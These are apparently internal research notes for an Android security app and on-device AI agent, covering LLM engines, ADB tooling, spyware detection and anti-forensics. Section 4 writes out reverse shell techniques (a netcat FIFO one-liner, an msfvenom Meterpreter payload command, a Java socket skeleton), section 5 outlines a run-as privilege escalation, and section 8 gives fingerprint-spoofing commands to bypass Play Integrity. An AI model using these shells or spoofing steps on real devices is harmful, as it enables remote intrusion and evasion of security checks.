# Archon Research — Consolidated Findings
## darkHal Security Group — Project AUTARCH
**Last Updated:** 2026-02-20

---

## 1. On-Device LLM Engines

### SmolChat-Android (Recommended)
- **Source:** https://github.com/shubham0204/SmolChat-Android
- **License:** Apache 2.0
- **Stack:** Kotlin + llama.cpp JNI bindings
- **Key feature:** `smollm` module is an embeddable Android library — 2-class Kotlin API
- **Model format:** GGUF (huge ecosystem on HuggingFace)
- **Performance:** Auto-detects CPU SIMD, has ARMv8.4 SVE optimized builds
- **Integration:** Streaming via Kotlin Flow, context tracking, chat templates from GGUF metadata
- **What it doesn't have:** No tool-calling — we add that via Koog (below)
- **Recommended models:** Qwen3-0.6B-Q4_K_M (tiny, fast) or SmolLM3-3B-Q4 (better quality)
- **Status:** Best choice for inference engine. Embed `smollm` module into Archon.

### mllm
- **Source:** https://github.com/UbiquitousLearning/mllm
- **License:** MIT
- **Stack:** C++20 custom engine
- **Key feature:** Multimodal (vision + text — Qwen2-VL, DeepSeek-OCR), Qualcomm QNN NPU acceleration
- **Model format:** Custom `.mllm` (must convert from HuggingFace, NOT GGUF)
- **Drawback:** Much harder to integrate, custom format limits model selection
- **Status:** Consider for future multimodal features (OCR scanning, photo analysis). Not for initial integration.

---

## 2. AI Agent Frameworks

### Koog AI (Recommended for Archon)
- **Source:** https://docs.koog.ai/
- **License:** Apache 2.0 (JetBrains)
- **Stack:** Pure Kotlin, Kotlin Multiplatform — officially supports Android
- **Key features:**
  - 9 LLM providers including Ollama (local) and cloud (OpenAI, Anthropic)
  - First-class tool-calling with class-based tools (works on Android)
  - Agent memory, persistence, checkpoints, history compression
  - Structured output via kotlinx.serialization
  - GOAP planner (A* search for action planning — game AI technique)
  - MCP integration (discover/use external tools)
  - Multi-agent: agents-as-tools, agent-to-agent protocol
- **Version:** 0.6.2
- **Integration:** `implementation("ai.koog:koog-agents:0.6.2")` — single Gradle dependency
- **Why it's the answer:** Native Kotlin, class-based tools on Android, GOAP planner maps perfectly to security workflows (Goal: "Protect device" → Actions: scan → identify → restrict → revoke)
- **Status:** Best choice for agent layer. Combine with SmolChat for fully offline operation.

### SmolChat + Koog Combo
- SmolChat provides the on-device inference engine (GGUF/llama.cpp)
- Koog provides the agent framework (tools, planning, memory, structured output)
- Together: fully autonomous, fully offline security AI agent on the phone
- Implementation: define security tools as Koog class-based tools, wrap PrivilegeManager.execute() as execution backend

### GitHub Copilot SDK
- **Source:** https://github.com/github/copilot-sdk
- **License:** MIT (SDK), proprietary (CLI binary ~61MB)
- **Stack:** Python/TypeScript/Go/.NET SDKs
- **Key features:** BYOK mode (Ollama local), MCP integration, linux-arm64 binary exists
- **Drawback:** CLI binary is closed-source proprietary. We already have our own LLM backends + MCP server. Adds another orchestration layer on top of what we built.
- **Status:** Not needed. Our own agent system (core/agent.py + core/tools.py) is better tailored.

---

## 3. ADB Exploitation & Automation

### PhoneSploit-Pro
- **Source:** https://github.com/AzeezIsh/PhoneSploit-Pro
- **License:** GPL-3.0
- **What:** Python ADB automation framework (40+ exploits/actions)
- **Capabilities:** Screen capture, app management, file transfer, keylogging, device info dumping, network analysis, shell access, APK extraction, location spoofing
- **Relevance:** Reference for ADB command patterns. Many of its techniques are already in our ShieldModule and HoneypotModule.
- **Status:** Reference material. We implement our own versions with better safety controls.

---

## 4. Android Reverse Shell Techniques

### Technique 1: Java ProcessBuilder + Socket (Our Approach)
```java
// Connect back to server, pipe shell I/O over socket
Socket socket = new Socket(serverIp, serverPort);
ProcessBuilder pb = new ProcessBuilder("sh");
Process process = pb.start();
// Forward process stdin/stdout over socket
```
- **Privilege:** Runs at whatever UID the process has
- **Our twist:** Run via `app_process` at UID 2000 (shell level)
- **Advantage:** No external tools needed, pure Java, clean control flow

### Technique 2: Netcat + FIFO
```bash
mkfifo /data/local/tmp/f
cat /data/local/tmp/f | sh -i 2>&1 | nc $SERVER_IP $PORT > /data/local/tmp/f
```
- **Requires:** `nc` (netcat) available on device
- **Advantage:** Simple, works from any shell
- **Disadvantage:** No auth, no encryption, no special commands

### Technique 3: msfvenom Payloads
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -o payload.apk
```
- **Generates:** Standalone APK with Meterpreter payload
- **Meterpreter types:** reverse_tcp, reverse_http, reverse_https
- **Disadvantage:** Detected by AV, requires separate app install, no shell-level access, external Metasploit dependency
- **Our approach is superior:** Already embedded in Archon, shell-level UID 2000, token auth, command safety blocklist

---

## 5. Android Privilege Escalation

### CVE-2024-0044 / CVE-2024-31317: Run-As Any UID (Android 12-14)
- **Disclosed by:** Meta security researchers
- **Severity:** Critical — full root access on unpatched devices
- **Affected:** Android 12, 13, 14 (patched in 14 QPR2 and Android 15)
- **Mechanism:** The `run-as` command trusts package data from `/data/system/packages.list`. At shell level (UID 2000), we can exploit a TOCTOU race to make `run-as` switch to ANY UID, including UID 0 (root) or UID 1000 (system).
- **Steps:**
  1. Shell can write to `/data/local/tmp/`
  2. Exploit the TOCTOU race in how `run-as` reads package info
  3. `run-as` runs as UID 2000 but switches context to target UID
- **Archon action:** Detection module that checks if device is vulnerable. If so, can use for legitimate protection (installing protective system-level hooks that persist until reboot).

### Shell-Level Capabilities (UID 2000)
Full command access without root:
- `pm` — install, uninstall, disable, grant/revoke permissions
- `am` — start activities, broadcast, force-stop processes
- `settings` — read/write system, secure, global settings
- `dumpsys` — dump any system service state
- `cmd` — direct commands to system services (appops, jobscheduler, connectivity)
- `content` — query/modify content providers (contacts, SMS, call log)
- `service call` — raw Binder IPC (clipboard, etc.)
- `input` — inject touch/key events (UI automation)
- `screencap`/`screenrecord` — capture display
- `svc` — control wifi, data, power, USB, NFC
- `dpm` — device policy manager (remove device admins)
- `logcat` — system logs
- `run-as` — switch to debuggable app context

### What Shell CANNOT Do (Root Required)
- Write to /system, /vendor, /product
- `setenforce 0` (set SELinux permissive)
- Access other apps' /data/data/ directly
- Load/unload kernel modules
- iptables/nftables (CAP_NET_ADMIN)
- Mount/unmount filesystems

---

## 6. Anti-Forensics (Anti-Cellebrite)

Cellebrite UFED and similar forensic tools attack vectors:
- ADB exploitation (need ADB enabled or USB exploit)
- Bootloader-level extraction
- Known CVE exploitation chains
- Content provider dumping

### Shell-Level Defenses
```bash
# USB Lockdown
svc usb setFunctions charging
settings put global adb_enabled 0

# Detect Cellebrite (known USB vendor IDs, rapid content query storms)
# Monitor USB events: /proc/bus/usb/devices

# Emergency data protection on forensic detection:
# - Revoke all app permissions
# - Clear clipboard (service call clipboard)
# - Force-stop sensitive apps
# - Disable USB debugging
# - Change lock to maximum security
```

### Architecture for Archon
- Background monitoring thread: USB events + logcat
- Forensic tool USB vendor ID database
- Configurable responses: lockdown / alert / wipe sensitive / plant decoys
- "Duress PIN" concept: specific PIN triggers data protection

---

## 7. Anti-Spyware (Anti-Pegasus)

NSO Group's Pegasus and similar state-level spyware use:
- Zero-click exploits via iMessage, WhatsApp, SMS
- Kernel exploits for persistence
- Memory-only implants (no files on disk)

### Shell-Level Monitoring
```bash
# Suspicious process detection
dumpsys activity processes | grep -i "pegasus\|chrysaor"

# Hidden processes (deleted exe links = classic implant pattern)
cat /proc/*/maps 2>/dev/null | grep -E "rwxp.*deleted"

# Exploit indicators in logs
logcat -d | grep -iE "exploit|overflow|heap|spray|jit"

# Unauthorized root checks
ls -la /system/xbin/su /system/bin/su /sbin/su 2>/dev/null
cat /sys/fs/selinux/enforce  # 1=enforcing, 0=permissive

# Certificate injection (MITM)
ls /data/misc/user/0/cacerts-added/ 2>/dev/null

# Known spyware package patterns
pm list packages | grep -iE "com\.network\.|com\.service\.|bridge|carrier"
```

### Archon Shield Integration
- Periodic background scans (configurable interval)
- Known C2 IP/domain database (updated from AUTARCH server)
- Process anomaly detection (unexpected UIDs, deleted exe links)
- Network connection monitoring against threat intel

---

## 8. Device Fingerprint Manipulation

### Play Integrity Levels
1. **MEETS_BASIC_INTEGRITY** — Can be satisfied with prop spoofing
2. **MEETS_DEVICE_INTEGRITY** — Requires matching CTS profile
3. **MEETS_STRONG_INTEGRITY** — Hardware attestation (impossible to fake at shell level)

### Shell-Level Spoofing
```bash
# Android ID rotation
settings put secure android_id $(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 16)

# Build fingerprint spoofing
setprop ro.build.fingerprint "google/raven/raven:14/UP1A.231005.007:user/release-keys"
setprop ro.product.model "Pixel 6 Pro"

# "Old device" trick (bypass hardware attestation requirement)
setprop ro.product.first_api_level 28  # Pretend shipped with Android 9
```

### Donor Key Approach
- Valid attestation certificate chains from donor devices could theoretically be replayed
- Keys are burned into TEE/SE at factory
- Google revokes leaked keys quickly
- Legally/ethically complex — research only

---

## 9. Samsung S20/S21 Specifics (TODO)

### JTAG/Debug Access
- JTAG pinpoints and schematics for S20/S21 hardware debugging
- Bootloader weakness analysis (Samsung Knox, secure boot chain)
- Secureboot partition dumping techniques

### Hardening Guide
- Samsung-specific security settings and Knox configuration
- Tool section for Samsung devices

**Status:** Research needed — not yet documented.

---

## 10. Future: LLM Suite Architecture

### Recommended Stack
```
┌──────────────────────────────────────┐
│         Koog AI Agent Layer          │
│   (tools, GOAP planner, memory)     │
├──────────────────────────────────────┤
│   SmolChat smollm Module             │
│   (GGUF inference, llama.cpp JNI)   │
├──────────────────────────────────────┤
│   Security Tools (Kotlin)            │
│   (ScanPackagesTool,                 │
│    RestrictTrackerTool, etc.)        │
├──────────────────────────────────────┤
│   PrivilegeManager                   │
│   (ROOT/ARCHON_SERVER/ADB/NONE)     │
└──────────────────────────────────────┘
```

### Integration Steps
1. Add `smollm` as module dependency (embeds llama.cpp JNI)
2. Add `koog-agents` Gradle dependency
3. Define security tools as Koog class-based tools
4. Create "Security Guardian" agent with GOAP planner
5. Can run fully offline (on-device GGUF) or via Ollama on AUTARCH server
6. Agent autonomously monitors and responds to threats

**Status:** Future phase — implement after reverse shell is complete.
